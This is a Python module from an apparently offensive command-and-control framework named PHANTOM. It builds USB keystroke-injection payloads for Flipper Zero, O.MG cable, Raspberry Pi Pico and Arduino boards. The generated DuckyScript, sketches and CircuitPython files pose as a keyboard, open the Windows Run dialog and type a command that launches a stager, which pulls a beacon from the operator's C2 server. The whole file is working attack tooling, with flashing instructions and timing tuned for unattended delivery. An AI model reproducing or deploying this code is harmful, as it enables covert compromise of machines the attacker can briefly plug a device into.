"""hid_builder.py — the USB HID delivery vector (9.1 / 9.2).

AutoRun on removable volumes has been disabled by Windows at the OS level
for years, so "drop a USB stick and wait" is not a vector: a mass-storage
device cannot be relied on to execute anything. What still works is a board
that PRESENTS ITSELF AS A KEYBOARD and types the payload into whatever
machine it is plugged into:

* ``pico``    — RP2040 / Raspberry Pi Pico running CircuitPython
                (``adafruit_hid``): the artefact is a ``main.py``;
* ``flipper`` — Flipper Zero BadUSB: a DuckyScript file;
* ``omg``     — O.MG cable web UI: DuckyScript as well, with its own
                replay/timing extensions;
* ``arduino`` — an Arduino-IDE board (ATmega32U4 / CH552 / ESP32 class)
                running the bundled ``Keyboard`` library: the artefact is a
                ``.ino`` sketch. These boards have far less flash than a
                CircuitPython Pico, which is fine: the payload is the TYPED
                COMMAND, and the beacon it launches is downloaded from the
                C2, never stored on the board.

The board carries firmware and the typed command, and nothing else. A
scant-flash board (tens of KB) is enough for exactly that reason: the
typed command is a short launcher for the resilient stager, so it works
when the C2 is not up yet — the stager retries by itself.

WHY THE OPERATOR CHOOSES (9.2): the same typed instruction cannot run on
every OS (a PowerShell one-liner is a syntax error on ``sh``, and PE ≠ ELF
≠ Mach-O for the binary it downloads), and there is no way for the board to
detect the target OS before executing — it types into whatever it is
plugged into. So the board, the target family and the command are explicit
operator choices, and this module's job is to make that choice precise,
warn about the mismatches it CAN see (a Windows Run-dialog keystroke on a
Linux target) and never to guess.

Pure text generation: no I/O, no flashing, nothing writes a file here. The
``payload hid`` command writes what this returns.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Optional, Sequence, Tuple

BOARDS = ("pico", "flipper", "omg", "arduino")

# boards whose artefact is DuckyScript (the two hardware keystroke injectors
# that ship on the operator's bench)
DUCKYSCRIPT_BOARDS = ("flipper", "omg")

# boards whose artefact is an Arduino-IDE sketch using the bundled
# ``Keyboard`` HID library (ATmega32U4 / CH552 / ESP32-class boards that
# present themselves as a keyboard). These have nowhere near the flash of a
# CircuitPython Pico, so they cannot carry the beacon either — the typed
# command is the whole payload, and it points at the C2 the beacon comes
# from.
ARDUINO_BOARDS = ("arduino",)

# the keystroke that opens a command prompt, per target family
_RUN_DIALOG = {"windows": (("GUI", "R"), "run-dialog (Win+R)")}

DEFAULT_DELAY_MS = 1500

# A keystroke injector types the command ON SCREEN. It has to be short
# enough that the operator can afford to watch it (and that a board with a
# per-line/per-file script cap can hold it). The C2 stager is the short
# form; a hand-pasted one-liner may not be, and that is worth saying out
# loud instead of emitting a 11k-char artefact in silence.
LONG_COMMAND_CHARS = 1024


@dataclass(frozen=True)
class HidPayload:
    """One flashable/writable artefact plus the caveats the operator needs."""

    board: str
    filename: str
    content: str
    target: str = ""
    notes: Tuple[str, ...] = ()

    @property
    def lines(self) -> int:
        return len([l for l in self.content.splitlines() if l.strip()])

    def summary(self) -> str:
        head = f"{self.board} HID payload -> {self.filename} ({self.lines} lines)"
        if self.target:
            head += f" for {self.target} targets"
        return " | ".join((head,) + tuple(self.notes))


def _duckyscript(command: str, *, delay_ms: int, press_enter: bool,
                 open_run: bool, target: str) -> str:
    lines = ["REM PHANTOM HID payload — types one command, then presses Enter",
             "REM flash/write this to the board; nothing executes on the "
             "operator box",
             f"DELAY {max(0, int(delay_ms))}"]
    if open_run:
        key = _RUN_DIALOG.get(target, (("GUI", "R"), ""))[0]
        lines.append("REM open the run dialog: " + " + ".join(key))
        lines.append("HOLD " + " ".join(key))
        lines.append(f"DELAY {min(500, max(100, delay_ms // 3))}")
    # STRING types the command verbatim; a leading SPACE would be typed too,
    # so the command is emitted on its own token
    lines.append("STRING " + command)
    if press_enter:
        lines.append("DELAY 200")
        lines.append("ENTER")
    return "\n".join(lines) + "\n"


def _arduino_sketch(command: str, *, delay_ms: int, press_enter: bool,
                    open_run: bool, target: str) -> str:
    """An Arduino-IDE sketch for a RAM-constrained keystroke board.

    ``Keyboard.print`` reads the command from PROGMEM (``F(...)``), so an
    11k-char command does not have to fit in the ~2.5 KB SRAM an ATmega32U4
    has — it only has to fit in flash, which it does. This is why a 42 KB
    board is enough for the stager: the beacon is never on the board.
    """
    # the command travels as a C string literal: backslash and the closing
    # quote are the only characters that would end it early
    literal = command.replace("\\", "\\\\").replace('"', '\\"')
    body = [
        "// PHANTOM HID payload — Arduino-IDE keystroke board (Keyboard.h).",
        "// Flash with the Arduino IDE: the board presents itself as a",
        "// keyboard and types ONE command, then presses Enter.",
        "#include <Keyboard.h>",
        "",
        "void setup() {",
        f"  delay({max(0, int(delay_ms))});  // host enumerates the HID device",
        "  Keyboard.begin();",
    ]
    if open_run:
        body += [
            "  // open the run dialog (Win+R)",
            "  Keyboard.press(KEY_LEFT_GUI);",
            "  Keyboard.press('r');",
            "  Keyboard.releaseAll();",
            f"  delay({min(500, max(100, delay_ms // 3))});",
        ]
    body += [
        "  // the command, typed verbatim (F() keeps it in flash, not RAM)",
        f'  Keyboard.print(F("{literal}"));',
    ]
    if press_enter:
        body += [
            "  delay(200);",
            "  Keyboard.press(KEY_RETURN);",
            "  Keyboard.releaseAll();",
        ]
    body += [
        "}",
        "",
        "void loop() {}",
        "",
    ]
    return "\n".join(body)


def _circuitpython(command: str, *, delay_ms: int, press_enter: bool,
                   open_run: bool, target: str) -> str:
    key = _RUN_DIALOG.get(target, (("GUI", "R"), ""))[0]
    run_press = ", ".join(f"Keycode.{part}" for part in key)
    run_release = ", ".join(f"Keycode.{part}" for part in key)
    body = [
        "# PHANTOM HID payload — RP2040 / Pico, CircuitPython.",
        "# Copy this file to the board as main.py (with the adafruit_hid",
        "# library in lib/). The board presents itself as a keyboard and",
        "# types ONE command, then presses Enter.",
        "import time",
        "import usb_hid",
        "from adafruit_hid.keyboard import Keyboard",
        "from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS",
        "from adafruit_hid.keycode import Keycode",
        "",
        "kbd = Keyboard(usb_hid.devices)",
        "layout = KeyboardLayoutUS(kbd)",
        "",
        f"time.sleep({max(0.1, delay_ms / 1000.0):.2f})  # host enumerates the HID device",
        "",
    ]
    if open_run:
        body += [
            f"# open the run dialog ({' + '.join(key)})",
            f"kbd.press({run_press})",
            "kbd.release_all()",
            f"time.sleep({min(0.5, max(0.1, delay_ms / 3000.0)):.2f})",
            "",
        ]
    body += [
        "# the command, typed verbatim",
        f"layout.write({command!r})",
        "",
    ]
    if press_enter:
        body += [
            "time.sleep(0.2)",
            "kbd.press(Keycode.ENTER)",
            "kbd.release_all()",
            "",
        ]
    return "\n".join(body)


def build_hid_payload(board: str, command: str, *,
                      target: str = "",
                      delay_ms: int = DEFAULT_DELAY_MS,
                      press_enter: bool = True,
                      open_run: bool = False) -> HidPayload:
    """Build the artefact for one board, or say why it cannot be built.

    Raises ``ValueError`` on an unknown board or an empty command: a blank
    HID payload is a bad flash, not a silent no-op.
    """
    board = (board or "").strip().lower()
    if board not in BOARDS:
        raise ValueError(f"unknown HID board {board!r}: choose from "
                         f"{', '.join(BOARDS)}")
    command = (command or "").strip()
    # the operator quotes the command on the command line; a keystroke
    # injector would type those grouping quotes as part of the instruction
    if len(command) >= 2 and command[0] == command[-1] \
            and command[0] in "\"'":
        command = command[1:-1].strip()
    if not command:
        raise ValueError("no command to type: a HID payload cannot be empty")
    target = (target or "").strip().lower()

    notes = []
    if open_run:
        if target == "windows":
            notes.append("target windows: opens the run dialog (Win+R) first")
        elif target:
            notes.append(
                f"target {target}: the run dialog is a WINDOWS keystroke — "
                f"it is ignored on this target; type into a shell instead")
        else:
            notes.append("run dialog assumed (no target given): Windows only")
    if (
        target == "windows"
        and command.lstrip().lower().startswith(("sh ", "bash ", "curl -sk"))
    ):
        notes.append("the command looks POSIX but the target is Windows")
    if target and target != "windows" and command.lstrip().lower().startswith(
            ("powershell", "cmd ", "-enc")):
        notes.append(f"the command looks Windows but the target is {target}")
    if not target:
        notes.append("the typed command must match the TARGET os: nothing "
                     "here detects it (the board types into whatever it is "
                     "plugged into)")
    if len(command) > LONG_COMMAND_CHARS:
        notes.append(
            f"very long command ({len(command)} chars): a keystroke injector "
            f"types it on screen IN FULL and it takes seconds — keep the "
            f"target focused and the board plugged in until typing finishes")

    if board in DUCKYSCRIPT_BOARDS:
        content = _duckyscript(command, delay_ms=delay_ms,
                               press_enter=press_enter, open_run=open_run,
                               target=target)
        filename = "phantom_hid.txt"
    elif board in ARDUINO_BOARDS:
        content = _arduino_sketch(command, delay_ms=delay_ms,
                                  press_enter=press_enter, open_run=open_run,
                                  target=target)
        filename = "phantom_hid.ino"
    else:
        content = _circuitpython(command, delay_ms=delay_ms,
                                 press_enter=press_enter, open_run=open_run,
                                 target=target)
        filename = "main.py"
    return HidPayload(board=board, filename=filename, content=content,
                      target=target, notes=tuple(notes))


def board_notes(board: str) -> Tuple[str, ...]:
    """How each board is flashed — the part that is not in the artefact."""
    board = (board or "").strip().lower()
    if board == "pico":
        return ("copy board firmware + lib/adafruit_hid, then write main.py "
                "to the CIRCUITPY volume",
                "a Pico is the only board here that can be rebuilt from a "
                "plain USB cable (RP2040 BOOTSEL)",)
    if board == "flipper":
        return ("copy the .txt to /ext/badusb/ on the SD card, then "
                "BadUSB -> the script (the Flipper acts as the keyboard)",)
    if board == "omg":
        return ("paste the DuckyScript into the O.MG cable web UI and store "
                "it on the device (the cable is the keyboard)",)
    if board in ARDUINO_BOARDS:
        return ("open the .ino in the Arduino IDE (the folder must be named "
                "phantom_hid) and upload it: the board is the keyboard",
                "the payload is the TYPED COMMAND, not a file on the board — "
                "a 42 KB flash board carries the stager fine because the "
                "beacon is downloaded, never stored",
                "F() keeps the string in flash: an ATmega-class board with "
                "~2.5 KB of RAM still types a multi-kilobyte command")
    return ()
